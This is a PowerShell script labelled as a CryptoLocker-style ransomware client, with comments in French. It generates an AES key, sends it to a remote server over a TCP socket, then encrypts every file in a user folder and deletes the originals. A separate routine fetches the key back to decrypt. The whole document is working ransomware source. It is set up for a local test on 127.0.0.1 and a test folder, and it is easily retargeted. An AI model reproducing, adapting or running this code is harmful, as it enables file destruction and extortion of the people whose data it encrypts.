## CryptoLocker AES Client
########################################################################
## Pour tester le programme en local, lancer le serveur sur un autre IDE. 
## (PowerGUI ou PowerShell ISE ne permettent pas le lancement de deux
## scripts en même temps)
## Le client demande au serveur une exfiltration de la clé. Si celle-ci
## abouti alors le client lance le ciffrement des données.
## Même fonctionnement dans le sens du déchiffrement.
#
#	   __  coincoin !
#	 >(^ )___
#	  ( ._> /
#	   `---'   HRN
########################################################################

# Création et chiffrement de la clé
function Create-Key {
	$Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create('AES')
	$Crypto.GenerateKey()
	return [System.Convert]::ToBase64String($Crypto.Key) | ConvertTo-SecureString -AsPlainText -Force
}

# Chiffrement fichier(s)
function Encrypt-File($Key, $FileName) {

	# Déchiffrement et récuperation de la clé
	$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)
	$EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))
	$Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create('AES')
	$Crypto.Keysize = $EncryptionKey.Length*8
	$Crypto.Key = $EncryptionKey
	
	# Récuperation du/des fichier(s)
	$Files = Get-ChildItem -LiteralPath $FileName
	foreach($File in $Files) {
		# Gestion lecture/écriture fichier
		$DestinationFile = $File.FullName + ".aes"
		$FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
		$FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)
		
		# Génération et écriture du vecteur d'initialisation
		$Crypto.GenerateIV()
		$FileStreamWriter.Write([System.BitConverter]::GetBytes($Crypto.IV.Length), 0, 4)
		$FileStreamWriter.Write($Crypto.IV, 0, $Crypto.IV.Length)
		
		# Chiffrement du fichier
		$Transform = $Crypto.CreateEncryptor()
		$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
		$FileStreamReader.CopyTo($CryptoStream)
		
		# Fermeture des streams et suppression du fichier original
		$CryptoStream.FlushFinalBlock()
		$CryptoStream.Close()
		$FileStreamReader.Close()
		$FileStreamWriter.Close()
		Remove-Item -LiteralPath $File.FullName
	}
}

# Déchiffrement fichier(s)
function Decrypt-File($Key, $FileName) {

	# Déchiffrement et récuperation de la clé
	$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)
	$EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))
	$Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create('AES')
	$Crypto.Keysize = $EncryptionKey.Length*8
	$Crypto.Key = $EncryptionKey
	
	# Récuperation du/des fichier(s)
	$Files = Get-ChildItem -LiteralPath $FileName
	foreach($File in $Files) {
		# Vérification de l'extension du fichier
		if(-not $File.Name.EndsWith(".aes")){
			continue
		}
		# Gestion lecture/écriture fichier
		$DestinationFile = $File.FullName -replace ".aes$"
		$FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
		$FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)
		
		# Récupération du vecteur d'initialisation
		# Seek positionne le pointeur de lecture du stream
		[Byte[]]$LenIV = New-Object Byte[] 4
		$FileStreamReader.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
		$FileStreamReader.Read($LenIV, 0, 3) | Out-Null
		[Int]$LIV = [System.BitConverter]::ToInt32($LenIV, 0)
		[Byte[]]$IV = New-Object Byte[] $LIV
		$FileStreamReader.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null
		$FileStreamReader.Read($IV, 0, $LIV) | Out-Null
		$Crypto.IV = $IV
		
		# Déchiffrement
		$Transform = $Crypto.CreateDecryptor()
		$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
		$FileStreamReader.CopyTo($CryptoStream)
		
		# Fermeture des streams et suppression du fichier original
		$CryptoStream.FlushFinalBlock()
		$CryptoStream.Close()
		$FileStreamReader.Close()
		$FileStreamWriter.Close()
		Remove-Item -LiteralPath $File.FullName
	}
}

## Envoi-réception clé puis
# Génère, envoi puis chiffre les données
function Start-Encryption {
	$Folder = "$env:userprofile\Documents\test\"
	# Ouverture du socket tcp
	$tcpConnection = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 80)
	$tcpStream = $tcpConnection.GetStream()
	$buffer = New-Object System.Byte[] 2048
	$encoding = New-Object System.Text.ASCIIEncoding
	$connected = $false
	$received = $false
	# Connection au serveur
	while (-not $connected){
		if ($tcpConnection.Connected){
			Write-Host "Connected"
			$connected = $true
			# Génération en envoi de la clé de chiffrement
			$Key = Create-Key
			$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)
			$EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))
			$data = $encoding.GetBytes($EncryptionKey)
			$tcpStream.Write($data, 0, $data.Length)
			$tcpStream.Flush()
			# Attente de confirmation du serveur pour lancer le chiffrement
			while (-not $received) {
				if ($tcpStream.DataAvailable) {
					$rawdata = $tcpStream.Read($buffer, 0, $buffer.Length)
			        $data = $encoding.GetString($buffer, 0, $rawdata)
					if ($data -eq "Key received") {
						Remove-Variable EncryptionKey
						$received = $true
						Write-Host "Key send - Launch encryption"
						Encrypt-File $Key $Folder
						Write-Host "Encryption done"
					}
				}
				Start-Sleep -Milliseconds 500
			}
		}
		Start-Sleep -Milliseconds 500
	}
	$tcpStream.Close()
	$tcpConnection.Close()
}

# Demande au serveur la clé puis déchiffre les données
function Start-Decryption {
	$Folder = "$env:userprofile\Documents\test\"
	# Ouverture du socket tcp
	$tcpConnection = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 80)
	$tcpStream = $tcpConnection.GetStream()
	$buffer = New-Object System.Byte[] 2048
	$encoding = New-Object System.Text.ASCIIEncoding
	$connected = $false
	$received = $false
	# Connection au serveur
	while (-not $connected){
		if ($tcpConnection.Connected){
			Write-Host "Connected"
			$connected = $true
			# Demande de la clé au serveur
			$data = $encoding.GetBytes("Get key")
			$tcpStream.Write($data, 0, $data.Length)
			$tcpStream.Flush()
			# Réception de la clé puis lancement du déchiffrement
			while (-not $received) {
				if ($tcpStream.DataAvailable) {
					$rawdata = $tcpStream.Read($buffer, 0, $buffer.Length)
			        $data = $encoding.GetString($buffer, 0, $rawdata)
					[Byte[]]$Key = $data.Split()
					if ($Key.length -eq 32) {
						$received = $true
						Write-Host "Key received - Launch decryption"
						$Key2 = [System.Convert]::ToBase64String($Key) | ConvertTo-SecureString -AsPlainText -Force
						Decrypt-File $Key2 $Folder
						Write-Host "Decryption done"
					}
				}
				Start-Sleep -Milliseconds 500
			}
		}
		Start-Sleep -Milliseconds 500
	}
	$tcpStream.Close()
	$tcpConnection.Close()
}

Start-Encryption
# Start-Decryption